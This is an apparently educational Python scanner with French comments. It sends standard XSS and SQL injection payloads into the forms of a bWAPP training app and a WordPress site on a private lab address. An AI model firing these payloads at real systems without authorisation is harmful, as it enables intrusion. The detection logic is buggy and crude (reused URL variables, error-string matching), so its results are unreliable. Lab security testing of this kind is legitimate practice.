import requests
from bs4 import BeautifulSoup, Comment
import re
from urllib.parse import urljoin

# URLs des applications
bwapp_url = 'http://192.168.8.135/bWAPP/portal.php'
wordpress_url = 'http://192.168.8.135/wordpress/'

# Récupération du contenu des pages
bwapp_response = requests.get(bwapp_url)
wordpress_response = requests.get(wordpress_url)

bwapp_content = bwapp_response.text
wordpress_content = wordpress_response.text

# Analyse des pages HTML avec BeautifulSoup
bwapp_soup = BeautifulSoup(bwapp_content, 'html.parser')
wordpress_soup = BeautifulSoup(wordpress_content, 'html.parser')

# Extraction des commentaires HTML
bwapp_comments = [comment for comment in bwapp_soup.find_all(text=lambda text: isinstance(text, Comment))]
wordpress_comments = [comment for comment in wordpress_soup.find_all(text=lambda text: isinstance(text, Comment))]

print("BWAPP HTML Comments:")
for comment in bwapp_comments:
    print(comment)

print("\nWordPress HTML Comments:")
for comment in wordpress_comments:
    print(comment)

# Extraction des formulaires
def extract_forms(soup):
    forms = soup.find_all('form')
    form_info = []
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'GET')
        inputs = form.find_all('input')
        form_details = {
            'action': action,
            'method': method,
            'inputs': [{'name': input_tag.get('name'), 'type': input_tag.get('type')} for input_tag in inputs]
        }
        form_info.append(form_details)
    return form_info

bwapp_forms = extract_forms(bwapp_soup)
wordpress_forms = extract_forms(wordpress_soup)

print("\nBWAPP Forms:")
for form in bwapp_forms:
    print(f"Form action: {form['action']}, Method: {form['method']}")
    for input_tag in form['inputs']:
        print(f"  Input name: {input_tag['name']}, Type: {input_tag['type']}")

print("\nWordPress Forms:")
for form in wordpress_forms:
    print(f"Form action: {form['action']}, Method: {form['method']}")
    for input_tag in form['inputs']:
        print(f"  Input name: {input_tag['name']}, Type: {input_tag['type']}")

# Scan des vulnérabilités

# Fonction pour vérifier les vulnérabilités XSS et SQL Injection
def scan_vulnerabilities(url, soup):
    # Recherche de paramètres dans les URLs et les formulaires
    urls = [url]
    urls += [urljoin(url, form['action']) for form in bwapp_forms + wordpress_forms if form['action']]
    
    # Rechercher les inputs dans les formulaires
    for form in bwapp_forms + wordpress_forms:
        for input_tag in form['inputs']:
            if input_tag['type'] in ['text', 'password']:
                # Essai de payloads pour XSS
                payloads = ['<script>alert(1)</script>', '"><img src="x" onerror="alert(1)">']
                for payload in payloads:
                    for url in urls:
                        test_url = urljoin(url, form['action']) if form['action'] else url
                        test_data = {input_tag['name']: payload}
                        response = requests.post(test_url, data=test_data) if form['method'] == 'POST' else requests.get(test_url, params=test_data)
                        if payload in response.text:
                            print(f"XSS vulnerability detected on {test_url} with payload {payload}")

                # Essai de payloads pour SQL Injection
                payloads = ["' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", '" OR 1=1 --']
                for payload in payloads:
                    test_data = {input_tag['name']: payload}
                    response = requests.post(test_url, data=test_data) if form['method'] == 'POST' else requests.get(test_url, params=test_data)
                    if 'error' in response.text.lower() or 'warning' in response.text.lower():
                        print(f"SQL Injection vulnerability detected on {test_url} with payload {payload}")

# Scan des vulnérabilités pour BWAPP et WordPress
print("\nScanning for vulnerabilities on BWAPP...")
scan_vulnerabilities(bwapp_url, bwapp_soup)

print("\nScanning for vulnerabilities on WordPress...")
scan_vulnerabilities(wordpress_url, wordpress_soup)
